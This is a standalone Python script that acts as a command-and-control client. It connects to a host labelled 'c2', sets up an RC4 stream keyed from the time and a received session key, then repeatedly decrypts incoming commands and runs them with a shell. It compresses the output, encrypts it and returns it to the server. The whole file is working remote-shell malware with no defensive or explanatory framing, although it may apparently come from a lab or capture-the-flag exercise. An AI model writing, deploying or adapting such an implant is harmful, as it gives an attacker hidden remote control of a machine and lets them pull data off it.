#!/usr/bin/env python3

import socket
import struct
import subprocess
import time
import zlib

HOST, PORT = "c2", 5000


def rc4_init(key):
    rc4_state = [i for i in range(256)]
    i = 0
    for j in range(256):
        i = (i + rc4_state[j] + key[j % len(key)]) & 0xFF
        rc4_state[j], rc4_state[i] = rc4_state[i], rc4_state[j]

    return rc4_state

def rc4_stream(rc4_state):
    i = 0
    j = 0
    while True:
        i = (1 + i) % 256
        j = (rc4_state[i] + j) % 256
        tmp = rc4_state[j]
        rc4_state[j] = rc4_state[i]
        rc4_state[i] = tmp
        yield rc4_state[(rc4_state[i] + rc4_state[j]) % 256]  

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))

    session_key = bytes(0x42 ^ x for x in sock.recv(16))
    rc4s = rc4_init(struct.pack('<Q', int(time.time())//10) + session_key)
    rc4 = rc4_stream(rc4s)

    while True:
        cmd_enc = sock.recv(1024)
        if len(cmd_enc) == 0:
            break
        cmd_dec = bytes(x^y for x,y in zip(rc4, cmd_enc)).decode()
        print(f'Running command: {cmd_dec}')
        res_dec = subprocess.check_output(cmd_dec, shell=True)
        print(f'Sending result:\n: {res_dec.decode()}')
        res_comp = zlib.compress(res_dec)
        res_enc = bytes(x^y for x,y in zip(rc4, res_comp))
        sock.sendall(res_enc)
